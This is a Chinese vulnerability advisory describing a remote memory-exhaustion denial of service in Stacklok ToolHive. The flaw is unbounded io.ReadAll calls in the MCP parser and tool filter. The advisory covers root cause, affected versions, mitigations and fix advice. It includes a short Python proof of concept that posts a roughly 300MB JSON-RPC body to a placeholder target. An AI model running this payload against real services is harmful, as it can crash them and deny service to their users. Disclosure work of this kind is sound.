# Stacklok ToolHive MCP解析层请求体无界读取导致远程拒绝服务漏洞

## 1. 漏洞标题

Stacklok ToolHive MCP解析层请求体无界读取导致远程拒绝服务漏洞

## 2. 漏洞厂商

Stacklok

## 3. 影响产品

ToolHive

项目地址：

```text
https://github.com/stacklok/toolhive
```

## 4. 影响对象类型

应用软件 / 服务端应用

## 5. 影响版本

经验证，以下版本受影响：

```text
ToolHive v0.27.1、v0.27.2、v0.28.0、v0.28.1、v0.28.2、v0.28.3、v0.29.0、v0.29.1
```

可在 CNVD 中简写为：

```text
ToolHive v0.27.1 至 v0.29.1
```

截至 2026-06-05，`origin/main` / `v0.29.1` commit `83e9eae` 仍存在该问题。

## 6. 漏洞类型

拒绝服务 / 资源消耗 / 内存耗尽

## 7. 漏洞等级建议

高危

## 8. CWE / CVSS

- CWE：`CWE-770 Allocation of Resources Without Limits or Throttling`
- CVSS 3.1：`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- CVSS 分数：7.5

## 9. 漏洞描述

Stacklok ToolHive 的 MCP 请求解析层存在请求体无界读取问题。攻击者可构造超大 HTTP JSON 请求体发送至 ToolHive 暴露的 MCP HTTP 入口，使服务端在 webhook 限流逻辑生效前通过 `io.ReadAll(r.Body)` 完整读取请求体，造成大量内存消耗，最终可能导致服务响应退化、进程 OOM 或崩溃，形成远程拒绝服务漏洞。

该问题的核心原因是 `pkg/mcp/parser.go` 与 `pkg/mcp/tool_filter.go` 在读取外部请求体时缺少请求体大小限制。虽然后续 webhook middleware 已使用 `http.MaxBytesReader` 设置 1MB 限制，但 MCP parser/tool filter 的执行顺序早于 webhook，因此该限制无法防止前置 MCP 解析层的无界读取。

## 10. 漏洞成因

当前受影响代码中存在以下无界读取点：

```go
// pkg/mcp/parser.go:85
bodyBytes, err := io.ReadAll(r.Body)
```

```go
// pkg/mcp/tool_filter.go:229
bodyBytes, err := io.ReadAll(r.Body)
```

上述读取点没有使用 `http.MaxBytesReader`、`io.LimitReader` 或其他等效请求体大小限制机制。

对比 webhook middleware 中的限制逻辑：

```go
r.Body = http.MaxBytesReader(w, r.Body, webhook.MaxRequestSize)
bodyBytes, err := io.ReadAll(r.Body)
```

该限制位于后续 webhook middleware，无法保护更早执行的 MCP parser/tool filter。

## 11. 攻击条件

攻击者需要能够向 ToolHive 暴露的 MCP HTTP 入口发送 HTTP 请求。

在 MCP HTTP 服务对公网、内网租户、共享网络或未充分认证的环境开放时，攻击者可通过构造超大请求体触发该漏洞。

## 12. PoC

以下 PoC 会向目标 ToolHive MCP HTTP 服务发送一个较大的 JSON-RPC 请求体，用于观察服务端内存占用和响应状态。

```bash
python3 - <<'PY'
import requests

url = "http://<target-host>:<port>/"
payload = {
    "jsonrpc": "2.0",
    "id": 1,
    "method": "tools/call",
    "params": {
        "name": "x",
        "arguments": {
            "blob": "A" * (300 * 1024 * 1024)
        }
    }
}

r = requests.post(url, json=payload, timeout=30)
print(r.status_code)
print(r.text[:200])
PY
```

将 `<target-host>:<port>` 替换为暴露的 ToolHive MCP HTTP 服务地址。

说明：实际测试时可根据测试环境内存大小调整 payload 大小，例如 50MB、100MB、300MB 或更大。请在授权测试环境中进行验证，并同时监控 ToolHive 进程内存占用。

## 13. 触发过程

1. 攻击者向 ToolHive MCP HTTP 入口发送超大 JSON-RPC 请求体。
2. 请求进入 MCP parser/tool filter。
3. `pkg/mcp/parser.go` 和 `pkg/mcp/tool_filter.go` 在未限制大小的情况下执行 `io.ReadAll(r.Body)`。
4. 服务端尝试完整读取并缓冲请求体。
5. 由于 webhook 的 `http.MaxBytesReader` 限制发生在后续 middleware，无法阻止前置 MCP 层的无界读取。
6. 服务进程内存快速升高，可能造成响应退化、OOM 或进程崩溃。

## 14. 验证结果

2026-06-05 对 `stacklok/toolhive` 当前 `origin/main` 进行复核，提交 `83e9eae` 中仍存在以下代码：

- `pkg/mcp/parser.go:85`：`bodyBytes, err := io.ReadAll(r.Body)`
- `pkg/mcp/tool_filter.go:229`：`bodyBytes, err := io.ReadAll(r.Body)`

同时 webhook 层的请求体限制位于：

- `pkg/webhook/mutating/middleware.go:94-95`
- `pkg/webhook/validating/middleware.go:103-104`

由于中间件执行顺序中 MCP parser/tool filter 位于 webhook 之前，因此 webhook 层的 `http.MaxBytesReader` 不能防止该前置无界读取问题。

## 15. 漏洞影响

成功利用该漏洞可能造成：

- ToolHive 进程内存占用异常升高；
- 服务响应明显变慢；
- GC 压力增加；
- 进程 OOM 或崩溃；
- MCP 服务不可用；
- 在共享部署环境中可能影响同机其他服务资源。

## 16. 临时解决方案

在官方修复发布前，建议采取以下临时缓解措施：

1. 在反向代理层限制请求体大小，例如 Nginx：

```nginx
client_max_body_size 1m;
```

2. 仅允许可信来源访问 MCP HTTP 入口。
3. 在防火墙、API 网关或反向代理中限制大请求体和异常请求频率。
4. 暂时关闭不必要的公网暴露。
5. 对 ToolHive MCP HTTP 服务增加前置限流和请求体大小限制。

## 17. 修复建议

建议厂商进行如下修复：

1. 在 MCP parser/tool filter 最早读取 HTTP 请求体的位置加入统一请求体大小限制；
2. 使用 `http.MaxBytesReader`、`io.LimitReader` 或等效机制限制最大请求体；
3. 对超限请求返回 `413 Request Entity Too Large`；
4. 避免多个 middleware 重复无限制缓冲同一请求体；
5. 将请求体大小上限设置为安全默认值，并允许管理员显式配置；
6. 增加回归测试，覆盖：
   - 超大 MCP JSON 请求在 parser 层被拒绝；
   - webhook 开启或关闭时均不能绕过限制；
   - `pkg/mcp/tool_filter.go` 路径同样受限制。
